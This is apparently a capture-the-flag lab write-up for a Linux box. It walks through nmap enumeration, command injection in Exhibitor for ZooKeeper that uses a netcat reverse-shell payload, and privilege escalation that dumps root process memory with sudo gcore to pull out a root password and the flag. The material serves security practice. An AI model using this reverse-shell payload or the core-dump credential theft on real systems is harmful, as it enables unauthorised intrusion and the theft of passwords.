

### Lab Details 

- Difficulty: Intermediate
- Type: Web, Linux Priv Esc

#### Enumeration
- run `nmap`
```
$ nmap 192.168.58.98 -sC -A --min-rate 1000 -p-
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 17:21 +0000
Nmap scan report for 192.168.58.98
Host is up (0.00032s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
| http-methods:
|_  Potentially risky methods: PUT
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.58.98:8080/exhibitor/v1/ui/index.html
34051/tcp open  java-rmi    Java RMI
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4
OS details: Linux 4.19 - 5.15
Network Distance: 2 hops
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-03-29T17:21:20
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-03-29T13:21:17-04:00
```
- enumerate the `http` ports and found `port 8081` is accessible 
- visit port `8081` and `Exhibitor for ZooKeeper` is presented
#### Initial Foothold 
- search online for exploit on `Exhibitor for ZooKeeper` 
- found a RCE for the app https://www.exploit-db.com/exploits/48654
- steps are 
	- Open the Exhibitor Web UI and click on the Config tab, then flip the Editing switch to ON
	- In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:
	- `$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)`
	- Click Commit > All At Once > OK
![[Pasted image 20260330023535.png]]
- save and load the changes, obtain a shell as `charles`
```
$ nc -lvnp 4444                                 
listening on [any] 4444 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.131.98] 49646
whoami
charles

```
#### Lateral Movement (If any)

#### Privilege Escalation
- load and run `linpeas.sh`, found the user is able to run `gcore` as root
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                      
Matching Defaults entries for charles on pelican:                                                                                                                    
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
Sudoers file: /etc/sudoers.d/charles is readable
charles ALL=(ALL) NOPASSWD:/usr/bin/gcore

charles@pelican:~$ sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```
- identify interesting processes
```
## get root process
ps -eo pid,command
```
- use `gcore` to generate a process dump file
```
## where the number is the pid
sudo gcore 513
```
- examine the dump file for password
```
$ strings core.513
<SNIP>
001 Password: root:
ClogKingpinInning731
<SNIP>
```

### Unintended way of obtaining the root flag
- obtain all root user processes 
```
<SNIP>
root       455     1  0 13:25 ?        00:00:00 /sbin/wpa_supplicant -u -s -O /r
root       457     1  0 13:25 ?        00:00:00 /usr/sbin/ModemManager --filter-
root       465     1  0 13:25 ?        00:00:00 /usr/lib/udisks2/udisksd
root       466     1  0 13:25 ?        00:00:00 /lib/systemd/systemd-logind
root       469   443  0 13:25 ?        00:00:00 /usr/sbin/CRON -f
root       487   469  0 13:25 ?        00:00:00 /bin/sh -c while true; do chown 
root       512     1  0 13:25 ?        00:00:00 /usr/lib/policykit-1/polkitd --n
root       513     1  0 13:25 ?        00:00:00 /usr/bin/password-store
root       514     1  0 13:25 ?        00:00:00 /usr/sbin/cups-browsed
root       554     1  0 13:25 ?        00:00:00 /usr/sbin/lightdm
root       557     1  0 13:25 ?        00:00:00 /usr/sbin/sshd -D
root       581     1  0 13:25 tty1     00:00:00 /sbin/agetty -o -p -- \u --nocle
root       582   554  0 13:25 tty7     00:00:00 /usr/lib/xorg/Xorg :0 -seat seat
root       584     1  0 13:25 ?        00:00:00 nginx: master process /usr/sbin/
root       636     1  0 13:25 ?        00:00:00 /usr/sbin/cupsd -l
root       657   554  0 13:25 ?        00:00:00 lightdm --session-child 18 21
root       720   554  0 13:25 ?        00:00:00 lightdm --session-child 14 21
root      1322     1  0 13:27 ?        00:00:00 /usr/sbin/smbd --foreground --no
root      1324  1322  0 13:27 ?        00:00:00 /usr/sbin/smbd --foreground --no
root      1325  1322  0 13:27 ?        00:00:00 /usr/sbin/smbd --foreground --no
root      1327  1322  0 13:27 ?        00:00:00 /usr/sbin/smbd --foreground --no
root      1596     1  0 13:28 ?        00:00:00 /usr/sbin/NetworkManager --no-da
<SNIP
```
- run `gcore` against all the processes and search for `root` keyword
```
charles@pelican:~$ strings core.* | grep root
<SNIP>
HOME=/root
ord successfully validated for 'root'
/cmd><name>%22/bin/bash%22  -c %27/bin/echo bdc41b86a9c6013333885d5859311bf8 %3E /root/proof.txt%27</name><pid>1740</pid><user>root</user><start>1774805309</start><eCode>0</eCode><eTime>1774805310</eTime></proc>
<SNIP>
```
#### Resources

#### Lesson Learned
- Dump credential using `gcore`
